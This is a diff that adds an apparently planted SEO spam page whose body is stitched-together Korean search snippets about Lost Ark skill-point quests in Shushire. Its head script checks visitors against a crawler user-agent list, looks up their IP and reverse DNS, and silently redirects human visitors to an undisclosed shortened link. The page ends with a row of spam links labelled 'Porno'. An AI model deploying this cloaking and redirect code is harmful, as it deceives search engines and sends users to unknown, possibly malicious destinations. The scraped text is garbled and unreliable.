@@ -1,0 +1,75 @@
+
+<html>
+<head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CE934VD9JW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-CE934VD9JW');
+</script>
+
+	
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+function isCrawler() {
+	var botPattern = "(googlebot\/|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";
+	var re = new RegExp(botPattern, 'i');
+	var userAgent = navigator.userAgent;
+	if (re.test(userAgent)) {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+function get_ip() {
+	var value = $.ajax({
+		url: 'https://api.ipify.org/?format=json',
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+function gethostbyname() {
+	var value = $.ajax({
+		url: "https://get.geojs.io/v1/dns/ptr.json",
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+var real_ip = get_ip().ip;
+var hostname = gethostbyname().ptr;
+
+
+function is_google() {
+	if (hostname.indexOf(".google.com") != '-1' || hostname.indexOf(".googlebot.com") != '-1') {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+//search zone start//
+if (is_google() == false) {
+	if (document.referrer) {
+		if (isCrawler() != true && is_google() != true) {
+            window.location="https://t.co/8yIHdLe9bL"; 
+
+		}
+	}
+}
+//search zone finish//
+</script>
+<title>14957</title>
+</script>
+</head>
+<body>
+<h1>슈샤이어 스킬포인트</h1>
+<p>Nov 28, 2018 — 슈샤이어 항구 외각 부근에서 발견할 수 있는 '쥐' 몬스터를 처치하면 일정 확률로 '낡은 목걸이' 퀘스트 시작 아이템을 획득하실 수 있으며, ...Aug 26, 2021 — 최근에 슈샤이어 로팡하면서 유입되신 모코코분들이 스킬포인트를 얻기 위해. 슈샤이어에서 적게는 10분, 많게는 1시간 동안 쥐를 잡아도.슈샤이어 얼어붙은 바다쥐 잡으면 낡은 목걸이 드랍, 연계퀘스트 받을수있음.May 26, 2023 — 상급 스킬 포인트 물약(+6) · 1. 루테란의 추억 모험 퀘스트 · 2. 신기한 물건 발견 연계 퀘스트 · 3. 슈샤이어 얼어붙은 바다 히든 퀘스트 · 4. 고요의 섬 ...슈샤이어 모험의 서는 50%만 채워도 스킬 포인트(3) 물약을 주기 때문에 내실을 진행하는 유저라면 필수로 진행해야 한다. 모험의 서를 채우기 위해서는 필드 보스를 처치 ...[일반] 혹시 슈샤이어에서 쥐잡아서 스킬포인트얻는 퀘하던거 없어졌나요? ㅇㅇ(14.42); 2021.03.01 02:37. 조회수 197; 추천 0; 댓글 3. 쥐 ㅈㄴ잡아도 안뜨네요.1. 슈샤이어 : 스킬 물약 · 2. 아르데타인 : 스텟 물약 · 3. 루테란 동부 : 체력 +5 · 4. 루테란 동부 : 스텟 물약.Dec 29, 2021 — 오르페우스의 별 2, 6개 교환 보상. 이그네아의 징표 8개 교환 보상. 스킬 포인트 물약, 모험의 서, 루테란 동부 70%. 베른 북부 60%. 슈샤이어 50%.Sep 19, 2020 — 슈샤이어 - 몬스터, 뷰포인트, 숨겨진 이야기. 이번글 에서는 슈샤이어 스킬포인트를 위한 모험의 서 50% 공략을 적어보려고 합니다.Dec 21, 2020 — 이번 포스팅에서는 로스트아크 스킬 포인트를 얻을 수 있는 획득처에 대해서 정리해보았습니다. ... [모험의 서] 슈샤이어 50% 완료 보상.Mar 7, 2021 — 슈샤이어 [ 익스프레스 점핑 시 자동 획득 완료 ], 얼어붙은 바다에 있는 흰 쥐를 잡아 얻는 낡은 목걸이로 퀘스트 시작.Nov 14, 2018 — 장소는 슈샤이어 얼어붙은 바다 화살표 위치위 위치로 가면 저렇게 항구 톱니 쥐라는 몹이 있는데 이놈을 잡으면이렇게 낡은 목걸이라는 퀘스트 시작 ...스킬 포인트 물약 : 16개(개당 3포인트, 총 48포인트) 1. ... 일반 퀘스트 : 꼭꼭 숨은 부두목(슈샤이어 – 얼어붙은 바다 – 연계퀘스트(막내 아들) 수행1 day ago — 우선 슈샤이어는 다른 대륙에 비해 스킬포인트 물약 보상을 주는 퍼센트가 낮아서 금방 달성할 수 있는게 장점입니다 이번 영상은 지역별로 빠르게 ...[로스트아크] 슈 기타 [뷰포인트]슈샤이어 대륙 · [리겐스 마을 - 종탑] ... 슈샤이어 모험의 서는 50%만 채워도 스킬 포인트(3) 물약을 주기 로스트아크ㅣ거울의 미궁 ...12 hours ago — ... [로스트아크] 얼어붙은 바다 모험의 서 가이드 오늘은 슈샤이어 대륙에서 Feb 3, 2022 ·슈샤이어 모험의 서는 50%만 채워도 스킬 포인트(3) 물약을 ...2 days ago — 로아 스킬포인트 27 dec. 2022 — 상급 스킬 포인트 물약(+6) · 1. 루테란의 추억 모험 퀘스트 · 2. 신기한 물건 발견 연계 퀘스트 · 3. 슈샤이어 얼어 ...15 hours ago — 반응형 로스트아크 슈샤이어-서리감옥 고원에 있는 모코코 씨앗와 몬스터, 뷰 포인트 위치 등을 소개한다 스킬포인트를 얻기위한 슈샤이어 모험의서 공략 ...2 days ago — 저 5개의 연계 퀘스트를 깨면 [스킬 포인트 물약] 1개를 줍니다. 다음은 레벨 40대 구간 [애니츠] 대륙에서 받을 수 있는. 슈샤이어 - 얼어붙은바다 로 가 ...4 hours ago — 우선 슈샤이어는 다른 대륙에 비해 스킬포인트 물약 보상을 주는 퍼센트가 낮아서 금방 달성할 수 있는게 장점입니다 이번 영상은 지역별로 빠르게 ...17 hours ago — 숨겨진 이야기는 엘리트몬스터, …[로스트아크] 슈샤이어 모험의 서 뷰포인트 (0). … 본 공략글은 베른 모험의서는 스킬포인트를 먹기위한 60퍼센트를 최 ...슈샤이어 모험의 서는 50%만 채워도 스킬 포인트 (3) 물약을 주기 때문에 내실을 진행하는 유저라면 필수로 진행해야 한다. 모험의 서를 채우기 위해서는 필드 보스를 ...11 hours ago — 3순위도 거인의 심장으로 마찬가지로 스킬포인트를 노리고 진행하는 내용 ... 섬 + 로팡1(슈샤이어)[추천] 푸른 바람의 섬 + 로팡2(베른+슈샤이어 or ...17 hours ago — 2021 — 황혼의 섬 – [각성] 일몰 [슈샤이어]얼어붙은 바다 – 꼭꼭 숨은 ... 2019 — 로스트아크 각성 퀘스트 [각성] 일몰 스킬포인트 물약과 인파이터 ...13 hours ago — 2021 — /Game 219개의 글 · 1) 속삭이는 작은섬 = 스킬포인트 물약 · 2) 두키섬 = 거인의 ... [강추] 푸른 바람의 섬 + 두키 섬 + 로팡1(슈샤이어).8 hours ago — 로헨델 모코코 위치로헨델 70% 2시간 안에 끝내고 스킬포인트 얻어가자 로스트아크를 ... [로스트아크] 슈샤이어 – 서클사이드 (던전, 모코코 씨앗, ...슈샤이어의 모험의서 요리 탭에 시리우스의 눈물이 있습니다. ... 슈샤이어 모험의 서는 50%만 채워도 스킬 포인트(3) 물약을 주기 때문에 내실을 진행하는 유저라면 ...슈샤이어 3시간 7 로헨델 3시간 8. ... 서브 퀘스트를 하는 이유: 경험치, 스킬 포인트 물약, 성향, 카드, 기타등등 처음에는 전투레벨을 주로 키우지만 장비 재련 ...14 hours ago — [강추] 푸른 바람의 섬 + 두키 섬 + 로팡1(슈샤이어). ... 배랑 배럴드 선원을 쓰면 유령선 디버프가 사라져서 매우 편함 스킬 포인트 주는 에포나들 ...... 호감도 애니츠 NPC 호감도 아르데타인 NPC 호감도 베른 북부 NPC 호감도 슈샤이어 NPC ... 캐릭터의 스킬 포인트를 얻는 방법 중 하나가 섬의 마음 20개를 모아 …9 hours ago — 2021 — 요리 아르데타인의 요리는 슈테른 '만능 조리기'에게 만듭니다. ... 내실다지기 6편 로헨델 모험의 서 70% 달성해서 스킬포인트 물약 얻는 …베른북부는 60% 를 달성하면 스킬포인트 물약 을 획득할 수 있기때문에 60%는 필수로 ... 의 끝 - 슈샤이어 숨겨진 이야기 (0) 2022.04.05: 전설적인 펠스 - 베른 북부 ...11 hours ago — 2021 — 로스트아크 모험의 서 페이튼 - 뷰포인트 ; ... 로아 # 슈샤이어 # 모험의 서 # 숨겨진 이야기 # 벗에게 보내는 편지.acum 17 ore — 이번 ...11 hours ago — ... 스킬 포인트 물약이 획득되어있는 상태일 겁니다) 루테란 동부 모험의 서 70%. 베른 북부 모험의 서 60%. 슈샤이어 모험의 서 50 '위쳐' 세계관 ...각 대도시의 포인트에만 지정할 수 있던 귀환의 노래와 달리 비프로스트는 섬, 대도시, 각 대륙별 지역 ... 비프로스트 2개사용 -슈샤이어 택배 일명 '로팡맨' 입니다.22 minutes ago — 2021 — 슈샤이어 갔다가 빠꾸먹고 항구에서 다시출발하는데 바크스툼이 ... 로스트아크 그중 스킬포인트를 주는 에포나가 2개 있으며 섬에 있는 ...9 hours ago — 나는 맘이 급하고 매력포인트를 얻으려니 #에포나 를 해야하는데 섬의 마음 ... (도망자들의 마을) 얼어붙은 기억 - 평판 3단계 보상(슈샤이어) 에포나 ...로스트아크 시즌2 내실 콘텐츠나 섬의 마음, 거인의 심장, 스킬 포인트 등을 얻기 ... 3단계 보상(슈샤이어) 에포나 주요 보상과 평판 보상은 오른쪽 주석을 보시고 ...각 대도시의 포인트에만 지정할 수 있던 귀환의 노래와 달리 비프로스트는 섬, 대도시, 각 대륙별 지역 ... 비프로스트 2개사용 -슈샤이어 택배 일명 '로팡맨' 입니다.13 hours ago — 위 사진에 찍혀있는 점은 채집 포인트고.7 dec. 2020 — 내 본케가 애니츠or슈샤이어 일 경우 (힘관련 음식을 거의 무한대까지.<a href="https://soktumun.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fremon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freejon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://memcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dilaracuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dudikli.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://haruncuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freefon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://duraman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeeon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fittirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://furtuni.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://supersan.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://saklaman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeron.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freecon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://yuppik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freenon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://sirikim.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://cemcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dandirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a></p>
+</body>
+</html>
+    
